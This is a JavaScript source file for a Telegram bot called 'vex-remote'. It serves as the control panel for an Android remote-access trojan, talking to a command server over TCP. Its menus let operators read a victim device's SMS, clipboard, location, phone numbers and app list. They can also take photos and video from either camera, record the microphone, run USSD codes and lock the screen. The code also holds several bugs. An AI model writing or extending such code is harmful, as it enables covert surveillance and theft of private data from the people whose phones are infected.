const token = '';
const chat_group = -4343;
const portname = "";
const passname = "";
const admins = [];
const hostname = "";
const portnumb = 4324;

const TelegramBot = require("node-telegram-bot-api");
const net = require("net");
const me = new net.Socket();
const bot = new TelegramBot(token, { polling: true });
let updating_users = [];

let hoping_messages = [
    ", be patient ...",
    ", everithing is gonna be ok",
    ". hunter must be careful",
    ". nothing yet sir",
    ""
];

function getHopingMessage(){
    return messages[Math.floor(Math.random() * messages.length)];
}

function isEven(number) {
    return number % 2 === 0;
}

function createKeyboard(access_list = [], devid, msgowner, callback = () => {}){
    let layers = [[]];
    let layer_index = 0;

    if (access_list.includes("getPhoneNumbers") && access_list.includes("getPhoneNumberInfo")){
            layers[layer_index].push({
                text: build("phone ☎"),
                callback_data: `phonePanel_${msgowner}_${devid}`
            });
        }

    if (access_list.includes("getAllSMS") || access_list.includes("sendSMS") || access_list.includes("setSMSFilter")){
        layers[layer_index].push({
            text: build("sms 📪"),
            callback_data: `smsPanel_${msgowner}_${devid}`
        });
    }

    if (access_list.includes("setSoundVolume")){
        layers[layer_index].push({
            text: build("volume 🔊"),
            callback_data: `volumePanel_${msgowner}_${devid}`
        });
    }

    for (let access of access_list) {
        if (layers[layer_index].length === 2 && layer_index % 2 === 0) {
            layer_index++;
            layers[layer_index] = [];
        } else if ( layers[layer_index].length === 1 && !(layer_index % 2 === 0) ){
            layer_index++;
            layers[layer_index] = [];
        }

        switch (access) {
            case "openUrl":
                layers[layer_index].push({
                    text: build("open-url 🚁"),
                    callback_data: `getApps_${msgowner}_${devid}`
                });
                break;
            case "sendToast":
                layers[layer_index].push({
                    text: build("toast 📦"),
                    callback_data: `sendToast_${msgowner}_${devid}`
                });
                break;
            case "sendNotification":
                layers[layer_index].push({
                    text: build("send-notif 🥤"),
                    callback_data: `sendNotification_${msgowner}_${devid}`
                });
                break;
            case "vibratePhone":
                layers[layer_index].push({
                    text: build("vibrate 👽"),
                    callback_data: `vibratePhone_${msgowner}_${devid}`
                });
                break;
            case "getGeoLocation":
                layers[layer_index].push({
                    text: build("location 🗺"),
                    callback_data: `getGeoLocation_${msgowner}_${devid}`
                });
                break;
            case "getInstalledApps":
                layers[layer_index].push({
                    text: build("apps 📃"),
                    callback_data: `getInstalledApps_${msgowner}_${devid}`
                });
                break;
            case "getClipboard":
                layers[layer_index].push({
                    text: build("clipboard ⛓"),
                    callback_data: `getClipboard_${msgowner}_${devid}`
                });
                break;
            case "runUSSD":
                layers[layer_index].push({
                    text: build("run-ussd 🌌"),
                    callback_data: `runUSSD_${msgowner}_${devid}`
                });
                break;
            case "lockScreen":
                layers[layer_index].push({
                    text: build("lock 🔒"),
                    callback_data: `lockScreen_${msgowner}_${devid}`
                });
                break;
            case "unlockScreen":
                layers[layer_index].push({
                    text: build("unlock 🔓"),
                    callback_data: `unlockScreen_${msgowner}_${devid}`
                });
                break;
            case "takeScreenshot":
                layers[layer_index].push({
                    text: build("screen-shot 🍃"),
                    callback_data: `takeScreenshot_${msgowner}_${devid}`
                });
                break;
            case "takeBackshot":
                layers[layer_index].push({
                    text: build("back-shot 🌑"),
                    callback_data: `takeBackshot_${msgowner}_${devid}`
                });
                break;
            case "takeFrontshot":
                layers[layer_index].push({
                    text: build("front-shot 🌕"),
                    callback_data: `takeFrontshot_${msgowner}_${devid}`
                });
                break;
            
            case "recordFront":
                layers[layer_index].push({
                    text: build("record-front 👁"),
                    callback_data: `recordFront_${msgowner}_${devid}`
                });
                break;
            
            case "recordBack":
                layers[layer_index].push({
                    text: build("record-back 🌩"),
                    callback_data: `recordBack_${msgowner}_${devid}`
                });
                break;
            case "recordMicrophone":
                layers[layer_index].push({
                    text: build("record-mic 🌩"),
                    callback_data: `recordMicrophone_${msgowner}_${devid}`
                });
                break;
        }
    }

    if (layers[layer_index].length === 0) {
        layers.pop();
    }

    layers.push([]);
    layers[layers.length - 1].push({
        text: build("close"),
        callback_data: `close_${msgowner}`
    });

    callback(layers);
}

function build(string) {
    const translationTable = {
        'q': 'ǫ', 'w': 'ᴡ', 'e': 'ᴇ', 'r': 'ʀ', 't': 'ᴛ',
        'y': 'ʏ', 'u': 'ᴜ', 'i': 'ɪ', 'o': 'ᴏ', 'p': 'ᴘ',
        'a': 'ᴀ', 's': 's', 'd': 'ᴅ', 'f': 'ғ', 'g': 'ɢ',
        'h': 'ʜ', 'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'z': 'ᴢ',
        'x': 'x', 'c': 'ᴄ', 'v': 'ᴠ', 'b': 'ʙ', 'n': 'ɴ',
        'm': 'ᴍ'
    };

    return string.split('').map(char => translationTable[char] || char).join('');
}

function chunkArray(array) {
    const result = [];
    for (let i = 0; i < array.length; i += 10) {
        result.push(array.slice(i, i + 10));
    }
    return result;
}

me.connect(portnumb, hostname, () => {})

bot.on('message', async (message) => {
    if (message.chat.id == chat_group){
        if (admins.includes(message.from.id)){
            if (message.text.startsWith("/start")){
                await bot.sendMessage(
                    chat_group,
                    build("🎛 | vex-remote is online and active\n🔊 | called by ") + `<a href="tg://openmessage?user_id=${message.from.id}">${message.from.first_name + " " + message.from.last_name}</a>` + build("\n📥 | be careful about ") + `<a href="t.me/VexPrivacy">${build("privacy")}</a>`,
                    {
                        reply_to_message_id: message.message_id,
                        parse_mode: "HTML",
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    {
                                        text: build("users 👥"),
                                        callback_data: `seeusers_${message.from.id}_0`
                                    }
                                ]
                            ]
                        }
                    }
                )
            } else if (["حق مدیر", "promote"].includes(message.text)){
                if (message.reply_to_message){
                    if (admins.includes(message.reply_to_message.from.id)){
                        await bot.sendMessage(
                            message.chat.id,
                            build("🔴 | user is already admin of bot"),
                            {
                                reply_to_message_id: message.message_id
                            }
                        )
                    } else {
                        admins.push(message.reply_to_message.from.id);
                        await bot.sendMessage(
                            message.chat.id,
                            build("🗃 | user ") + `<a href="tg://openmessage?user_id=${message.reply_to_message.from.id}">${message.reply_to_message.from.id}</a> ` + build("promoted"),
                            {
                                reply_to_message_id: message.message_id,
                                parse_mode: "HTML"
                            }
                        )
                    }
                } else {
                    await bot.sendMessage(
                        message.chat.id,
                        build("🔴 | please reply on someone"),
                        {
                            reply_to_message_id: message.message_id
                        }
                    )
                }
            } else if (["حذف مدیر", "depromote"].includes(message.text)){
                if (message.reply_to_message){
                    if (!admins.includes(message.reply_to_message.from.id)){
                        await bot.sendMessage(
                            message.chat.id,
                            build("🔴 | user is not admin yet"),
                            {
                                reply_to_message_id: message.message_id
                            }
                        )
                    } else {
                        admins.push(message.reply_to_message.from.id);
                        await bot.sendMessage(
                            message.chat.id,
                            build("🚧 | user ") + `<a href="tg://openmessage?user_id=${message.reply_to_message.from.id}">${message.reply_to_message.from.id}</a> ` + build("depromoted"),
                            {
                                reply_to_message_id: message.message_id,
                                parse_mode: "HTML"
                            }
                        )
                    }
                } else {
                    await bot.sendMessage(
                        message.chat.id,
                        build("🔴 | please reply on someone"),
                        {
                            reply_to_message_id: message.message_id
                        }
                    )
                }
            } else if (message.text.startsWith("/sign_")){
                let _devid = message.text.slice(6, message.text.length).trim();
                if (_devid == undefined || _devid == null || _devid == ""){
                    await bot.sendMessage(
                        message.chat.id,
                        build("🔴 | no device id detected"),
                        {
                            reply_to_message_id: message.message_id
                        }
                    )
                } else {
                    me.write(JSON.stringify({
                        method: "getUserByDeviceId",
                        port: portname,
                        password: passname,
                        mask: "metro",
                        device_id: _devid
                    }));

                    me.on("data", async (data) => {
                        let _message = JSON.parse(data.toString());
                        if (_message.method == "getUserByDeviceId"){
                            if (!_message.status){
                                await bot.sendMessage(
                                    message.chat.id,
                                    build("🔴 | user not found"),
                                    {
                                        reply_to_message_id: message.message_id
                                    }
                                )
                            } else {
                                createKeyboard(_message.user.accessory, _message.user.device_id, message.from.id, async (keyboard) => {
                                    await bot.sendMessage(
                                    message.chat.id,
                                    build("🦋 | user selected\n🌐 | device id: ") + `<code>${_devid}</code>` + build(`📁 | has ${_message.user.accessory.length} access`),
                                        {
                                            reply_to_message_id: message.message_id,
                                            parse_mode: "HTML",
                                            reply_markup: {
                                                inline_keyboard: keyboard
                                            }
                                        }
                                    )
                                })
                            }
                        }
                    })
                }
            }
        }
    }
})

bot.on("callback_query", async (call) => {
    let spl = call.data.split("_");
    let mode = spl[0];
    let uid = parseInt(spl[1]);
    if (uid == call.from.id){
        if (mode == "seeusers"){
            if (updating_users.length == 0){
                await bot.editMessageText(
                    build(`🔭 | none connected yet${getHopingMessage()}`),
                    {
                        message_id: call.message.message_id,
                        chat_id: call.message.chat.id
                    }
                )
                return;
            }

            let inslice = parseInt(spl[2]);
            let slices = chunkArray(updating_users);
            let realslice = slices[inslice] || [];
            let keyboard = [[]]

            if (inslice > 0){
                keyboard[0].push({
                    text: build("⏮ previous"),
                    callback_data: `seeusers_${uid}_${inslice - 1}`
                });
            }

            if (inslice < slices.length - 1){
                keyboard[0].push({
                    text: build("next ⏭"),
                    callback_data: `seeusers_${uid}_${inslice + 1}`
                });
            }

            if (realslice.length == 0){
                await bot.editMessageText(
                    build("🔴 | the list of users were changed\n🔌 | please use ") + "/start" + build(" again to see handled-users"),
                    {
                        message_id: call.message.message_id,
                        chat_id: call.message.chat.id
                    }
                )
            } else {
                let s = `🔰 | connected users box\n🕸 | ${updating_users.length} were connected\n📦 | page ${inslice+1}/${slices.length}`;
                for (let target of slices){
                    s += `\n\n🛠 | <code>${target.command}</code>\n📄 | ` + build(`has ${target.access.length} access`);
                }

                await bot.editMessageText(
                    s,
                    {
                        message_id: call.message.message_id,
                        chat_id: call.message.chat.id,
                        parse_mode: "HTML",
                        reply_markup: {
                            inline_keyboard: keyboard
                        }
                    }
                )
            }
        }
    }
})

setInterval(() => {
    me.write(JSON.stringify({
        method: "getUsers",
        port: portname,
        password: passname,
        mask: "metro"
    }))

    me.on("data", async (data) => {
        let _message = JSON.parse(data.toString());
        if (_message.method == "getUsers"){
            updating_users = _message.users;
        }
    })
}, 3000)